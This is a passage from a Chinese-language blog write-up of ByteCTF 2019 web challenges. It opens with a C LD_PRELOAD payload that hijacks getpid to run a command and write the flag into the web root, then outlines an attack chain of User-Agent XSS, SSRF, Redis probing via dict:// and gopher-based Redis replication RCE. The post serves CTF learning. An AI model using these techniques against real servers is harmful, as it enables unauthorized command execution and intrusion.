class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>  _GNU_SOURCE</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pwn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{</span><br><span class="line">truesystem(<span class="hljs-string">"/readflag &gt; /var/www/html/res 2&gt;&amp;1"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getpid</span><span class="hljs-params">()</span></span>{</span><br><span class="line">  unsetenv(<span class="hljs-string">"LD_PRELOAD"</span>);</span><br><span class="line">  pwn();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>在当前 web 目录拿到 flag。//因为是复现环境就无所谓了。</p><h2 id="dot-server-prove"><a href="#dot-server-prove" class="headerlink" title="dot_server_prove"></a>dot_server_prove</h2><p>这个题比赛的时候没怎么看，看了 <a href="https://xz.aliyun.com/t/6312" target="_blank" rel="noopener">bytesCTF dot_server_prove WriteUP</a>，简单总结一下涉及的知识点：</p><ul><li>逆向 bin 文件查看逻辑，根据 host 来访问不同的站点，就像 apache 的 virtualhost 一样，读取 log 来保存你的 ua</li><li>在 ua 处进行 xss ，读取页面有 ssrf</li><li>ssrf 打 dict://172.18.0.3:6379/info 得到 redis 版本号 4.x</li><li>通过 gopher 利用主从复制的进行 RCE</li></ul><h2 id="iCloudMusic"><a href="#iCloudMusic" class="headerlink" title="iCloudMusic"></a>iCloudMusic</h2><p>打算与 SUCTF 的 iCloudMusic 放一起写吧</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>题目都不算特别难，除了马师傅的 iCloudMusic 跟 dot_server_prove ，两个不是很摸得着头脑的题， Web1/2/3 都有点魔改凑题的嫌疑，这几题并没有特别亮眼的知识点，都属于考过的，后面两题还是比较有意思的，dot_server_prove 可能不是很 get 到点，毕竟也属于一个比较新颖的题目了，以及马师傅的 iCloudMusic ，毕竟也是专门研究了一个多月的 electron orz…还是有一点收获的，希望线下赛不会被打爆 orz…</p><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script></body></html></div><div class="columns is-variable is-1 is-multiline is-mobile"> <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/CTF/">#CTF</a></span> <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/sql%E6%B3%A8%E5%85%A5/">#sql注入</a></span></div><hr><blockquote class="colorquote info"><p>Article Author: Zeddy</p><p>Article Link: https://blog.zeddyu.info/2019/09/17/bytectf2019/index.html</p><p>Copyright Notice: With the exception of the special statement at the beginning of the article, all articles can be reprinted in accordance with the CC BY 4.0 agreement with the author&#39;s permission.</p></blockquote><blockquote class="colorquote success"><p>Ad: I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: https://blog.zeddyu.info/advertisement/</p><p>Ad: 想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a href="https://blog.zeddyu.info/advertisement/#知识星球" target="_blank" rel="noopener">知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a href="https://blog.zeddyu.info/advertisement/#International-CTF-Team" target="_blank" rel="noopener">International CTF Team</a> 查看详情</p></blockquote><div class="columns is-mobile is-multiline article-nav"> <span class="column is-12-mobile is-half-desktop article-nav-prev"><a href="/2019/09/17/windows-defender/">Windows Defender 侧信道攻击</a></span> <span class="column is-12-mobile is-half-desktop article-nav-next"><a href="/2019/08/24/SUCTF-2019/">SUCTF 2019 出题笔记 &amp; phar 反序列化的一些拓展</a></span></div></article><div class="comments"><h3 class="title is-4">Comments</h3><script>function loadDisqus(){var e=document,n=e.createElement("script");n.src="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqus.js",l=e.createElement("link"),l.href="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqusjs.css",l.setAttribute("rel","stylesheet"),(e.head||e.body).appendChild(n),e.head.appendChild(l),n.onload=function(){new DisqusJS({shortname:"zeddyu",siteName:"blog.zeddyu.info",identifier:document.location.origin+document.location.pathname+document.location.search,url:document.location.origin+document.location.pathname+document.location.search,title:document.title,api:"https://blog.zeddyu.info/api/",apikey:"57m1j10pU1WfesAhs8Ri3OcmPEaRmoyIuNCPcYaUu6mqWu6Ek4qvRiQf9CXl2JoH",admin:"ZeddYu",adminLabel:""})}}var runningOnBrowser="undefined"!=typeof window,isBot=runningOnBrowser&&!("onscroll"in window)||"undefined"!=typeof navigator&&/(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);setTimeout(function(){isBot||loadDisqus()},1)</script><div id="disqus_thread"></div></div></div></section><footer class="footer"><div class="container"><div class="columns content"><div class="column is-narrow has-text-centered"> &copy; 2021 Zedd&nbsp; Powered by <a href="http://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-minos">Minos</a></div><div class="column is-hidden-mobile"></div><div class="column is-narrow"><div class="columns is-mobile is-multiline is-centered"> <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/ZeddYu" target="_blank" rel="noopener">GitHub</a> <a class="column is-narrow has-text-black" title="RSS" href="https://blog.zeddyu.info/atom.xml">RSS</a> <a class="column is-narrow has-text-black" title="Twitter" href="https://twitter.com/ZeddYu_Lu" target="_blank" rel="noopener">Twitter</a></div></div></div></div></footer><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.24.0/moment-with-locales.min.js"></script><script>moment.locale("en-AU")</script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.6/clipboard.min.js"></script><style>.hljs{position:relative}.hljs .clipboard-btn{float:right;color:#9a9a9a;background:0 0;border:none;cursor:pointer}.hljs .clipboard-btn:hover{color:#8a8a8a}.hljs>.clipboard-btn{display:none;position:absolute;right:4px;top:4px}.hljs:hover>.clipboard-btn{display:inline}.hljs>figcaption>.clipboard-btn{margin-right:4px}</style><script>$(document).ready(function(){$("figure.hljs").each(function(t,e){var a="code-"+t,r=e.querySelector(".code"),c=$('<button>Copy <i class="far fa-clipboard"></i></button>');r.id=a,c.addClass("clipboard-btn"),c.attr("data-clipboard-target-id",a);var n=e.querySelector("figcaption");n?n.append(c[0]):e.prepend(c[0])}),new ClipboardJS(".clipboard-btn",{target:function(t){return document.getElementById(t.getAttribute("data-clipboard-target-id"))}}).on("success",function(t){t.clearSelection()})})</script><script src="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/js/script.js"></script><script src="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/js/insight.js"></script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1740444562387978" crossorigin="anonymous"></script><div class="searchbox ins-search"><div class="searchbox-mask"></div><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"> <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..."><span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"></div></div></div></div><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)"},CONTENT_URL:"/content.json"}</script><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script></body></html>